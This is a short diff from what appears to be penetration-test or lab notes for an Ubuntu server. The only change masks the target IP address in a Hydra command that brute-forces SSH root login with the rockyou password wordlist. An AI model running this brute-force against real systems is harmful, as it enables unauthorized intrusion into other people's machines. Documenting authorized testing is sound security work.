@@ -37,7 +37,7 @@ Target: Ubuntu Server (192.168.!!.!)
 
 
 ## Command Executed:
-hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.15.7 
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.!!.! 
 
 
 
